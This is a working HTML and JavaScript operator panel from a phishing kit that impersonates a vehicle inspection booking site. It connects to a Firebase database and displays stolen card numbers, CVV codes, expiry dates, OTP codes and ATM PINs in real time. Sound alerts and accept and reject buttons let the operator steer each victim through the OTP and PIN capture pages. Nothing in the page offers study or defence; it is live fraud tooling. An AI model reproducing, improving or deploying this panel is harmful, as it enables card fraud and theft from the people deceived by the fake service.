<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة تحكم العمليات</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    
    <style>
        :root { 
            --main-green: #1e7344; 
            --bg-gray: #e9ecef; /* خلفية رمادية */
            --row-bg: #ffffff; 
        }
        
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background-color: var(--bg-gray); 
            margin: 0; 
            padding: 20px; 
            color: #333;
        }
        
        .header { 
            background: #fff; 
            padding: 15px 25px; 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            border-bottom: 4px solid var(--main-green); 
            margin-bottom: 20px; 
            border-radius: 10px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .visitor-box {
            background: #f8f9fa;
            border: 1px solid #ddd;
            padding: 10px 20px;
            border-radius: 50px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: bold;
        }

        .pulse-dot { width: 10px; height: 10px; background: #28a745; border-radius: 50%; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(0.95); opacity: 1; } 70% { transform: scale(1.1); opacity: 0.7; } 100% { transform: scale(0.95); opacity: 1; } }

        .table-wrapper { width: 100%; overflow-x: auto; background: #fff; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
        table { width: 100%; border-collapse: collapse; min-width: 1200px; }
        
        th { background: #f1f3f5; color: #555; padding: 15px; font-size: 13px; text-align: center; border-bottom: 2px solid #dee2e6; }
        td { padding: 15px; text-align: center; border-bottom: 1px solid #eee; font-size: 14px; vertical-align: middle; }

        /* سطر العميل */
        .client-row:hover { background-color: #fcfcfc; }
        
        /* تنسيق رقم البطاقة لعدم الانعكاس */
        .card-number { 
            direction: ltr !important; 
            display: inline-block;
            font-family: 'Courier New', Courier, monospace; 
            font-weight: bold; 
            color: #1e7344;
            letter-spacing: 1px;
            background: #f1f1f1;
            padding: 4px 8px;
            border-radius: 4px;
        }

        .badge-page { background: #fff3cd; color: #856404; padding: 4px 10px; border-radius: 15px; font-size: 11px; font-weight: bold; border: 1px solid #ffeeba; }
        .otp-val { color: #d9534f; font-size: 18px; font-weight: bold; }
        .pin-val { color: #007bff; font-size: 18px; font-weight: bold; }

        /* الأزرار */
        .btn { padding: 8px 20px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; transition: 0.2s; font-size: 13px; }
        .btn-off { background: #ced4da !important; color: #6c757d !important; cursor: not-allowed; }
        .btn-accept.active { background: #28a745 !important; color: #fff; }
        .btn-reject.active { background: #dc3545 !important; color: #fff; }
    </style>
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="منصة حجز مواعيد الفحص الفني الدوري للمركبات">
    <meta name="keywords" content="فحص سيارات, حجز موعد, فحص دوري">
    <meta name="author" content="مركز سلامة المركبات">
    <meta name="robots" content="index, follow">
    <meta property="og:type" content="website">
    <meta property="og:title" content="منصة حجز مواعيد الفحص الفني">
    <meta property="og:description" content="منصة موحدة لحجز مواعيد الفحص الفني الدوري">
    <meta property="og:url" content="https://jaufasnfsa.vercel.app">
    <meta property="og:site_name" content="مركز سلامة المركبات">
    <meta name="theme-color" content="#2d5016">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
</head>
<body onload="_init()">

<audio id="alert_sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

<div class="header">
    <div style="display: flex; align-items: center; gap: 20px;">
        <strong style="font-size: 18px;">لوحة الرادار</strong>
        <div class="visitor-box">
            <div class="pulse-dot"></div>
            <span>العملاء النشطون: <span id="live_count" style="color:#28a745; font-size:20px;">0</span></span>
        </div>
    </div>
    <button onclick="_clear()" style="background:#6c757d; color:white; border:none; padding:8px 15px; border-radius:5px; cursor:pointer;">تصفير السجلات</button>
</div>

<div class="table-wrapper">
    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>الصفحة الحالية</th>
                <th>اسم العميل</th>
                <th>رقم البطاقة</th>
                <th>التاريخ / CVV</th>
                <th>الرمز (OTP)</th>
                <th>ATM PIN</th>
                <th>الإجراء</th>
            </tr>
        </thead>
        <tbody id="monitor">
            </tbody>
    </table>
</div>

<script>
    const config = { databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/" };
    let cache = {};

    function _init() {
        if (!firebase.apps.length) firebase.initializeApp(config);
        const db = firebase.database();

        // تحديث عداد الزيارات
        db.ref('orders').on('value', snap => {
            const data = snap.val() || {};
            const now = new Date().getTime();
            let active = 0;
            Object.values(data).forEach(item => {
                if (item.last_update && (now - item.last_update < 60000)) active++;
            });
            document.getElementById('live_count').innerText = active;
        });

        // مراقبة العملاء (البيانات)
        db.ref('orders').on('value', snapshot => {
            const orders = snapshot.val() || {};
            const monitor = document.getElementById('monitor');
            monitor.innerHTML = '';
            
            const ids = Object.keys(orders).reverse();

            ids.forEach((id, index) => {
                const d = orders[id];
                const count = ids.length - index;

                // صوت تنبيه عند التغيير
                const currentStr = JSON.stringify(d);
                let hasUpdate = false;
                if(cache[id] && cache[id] !== currentStr) {
                    document.getElementById('alert_sound').play().catch(()=>{});
                    hasUpdate = true;
                }
                cache[id] = currentStr;

                // تحديد المسار
                let nextStep = 'go_to_otp';
                if (d.otp_code || d.otp) nextStep = 'go_to_pin';
                if (d.atm_pin) nextStep = 'success';

                // تفعيل الأزرار
                const isReady = (d.next_step === 'waiting' || hasUpdate);
                const btnClass = isReady ? 'active' : 'btn-off';

                const row = `
                    <tr class="client-row">
                        <td><b>${count}</b></td>
                        <td><span class="badge-page">${d.current_page || 'البداية'}</span></td>
                        <td>${d.fullName || '---'}</td>
                        <td><span class="card-number">${d.cardNumber || '---'}</span></td>
                        <td>${d.expiryDate || '--/--'} | <b>${d.cvv || '---'}</b></td>
                        <td class="otp-val">${d.otp_code || d.otp || '----'}</td>
                        <td class="pin-val">${d.atm_pin || '----'}</td>
                        <td>
                            <div style="display:flex; gap:5px; justify-content:center;">
                                <button class="btn btn-accept ${btnClass}" onclick="${isReady ? `_send('${id}', '${nextStep}')` : ''}">قبول</button>
                                <button class="btn btn-reject ${btnClass}" onclick="${isReady ? `_send('${id}', 'wrong_card')` : ''}">رفض</button>
                            </div>
                        </td>
                    </tr>
                `;
                monitor.insertAdjacentHTML('beforeend', row);
            });
        });
    }

    function _send(id, step) {
        firebase.database().ref('orders/' + id).update({ 
            next_step: step,
            last_command_time: new Date().getTime(),
            last_update: new Date().getTime()
        });
    }

    function _clear() {
        if(confirm("مسح السجلات؟")) firebase.database().ref('orders').remove();
    }
</script>
</body>
</html>
